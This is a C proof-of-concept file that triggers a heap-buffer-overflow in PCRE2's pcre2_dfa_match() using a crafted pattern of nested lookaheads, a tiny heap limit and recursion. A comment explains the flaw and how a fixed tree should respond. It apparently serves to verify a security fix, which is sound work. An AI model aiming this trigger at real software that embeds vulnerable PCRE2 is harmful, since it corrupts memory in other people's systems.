/* Residual-vulnerability PoC for pcre2_dfa_match().
 *
 * Build (example):
 *   cc -fsanitize=address,undefined -g -O0 -I<build-dir> pocs/residual.c \
 *      <build-dir>/libpcre2-8.a -o residual
 *
 * The pattern nests eight lookaheads below a tiny (*LIMIT_HEAP=4) before
 * recursing with (?R). Matching "a" with pcre2_dfa_match() drives
 * more_workspace() in src/pcre2_dfa_match.c through a chain of small
 * assertion-sized workspace blocks and then into a recursion call that
 * needs a much larger ovector. On the vulnerable tree, the reused
 * workspace block is not checked against the size actually required by
 * the recursion, so the DFA engine writes past the end of the smaller
 * heap block (heap-buffer-overflow, CWE-787). On a tree carrying the
 * genuine upstream fix, pcre2_dfa_match() instead returns
 * PCRE2_ERROR_HEAPLIMIT.
 */

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
PCRE2_SPTR pattern = (PCRE2_SPTR)
  "(*LIMIT_HEAP=4)(?=(?=(?=(?=(?=(?=(?=(?=a))(?R))))))).";
PCRE2_SPTR subject = (PCRE2_SPTR)"a";
int errorcode;
PCRE2_SIZE erroroffset;
int workspace[1000];
pcre2_match_data *match_data;
int rc;

pcre2_code *re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, 0,
  &errorcode, &erroroffset, NULL);
if (re == NULL)
  {
  PCRE2_UCHAR buf[256];
  pcre2_get_error_message(errorcode, buf, sizeof(buf));
  fprintf(stderr, "compile failed at %lu: %s\n", (unsigned long)erroroffset, buf);
  return 1;
  }

match_data = pcre2_match_data_create(16, NULL);

rc = pcre2_dfa_match(re, subject, strlen((const char *)subject), 0, 0,
  match_data, NULL, workspace, sizeof(workspace)/sizeof(int));

printf("pcre2_dfa_match returned %d\n", rc);

pcre2_match_data_free(match_data);
pcre2_code_free(re);
return 0;
}
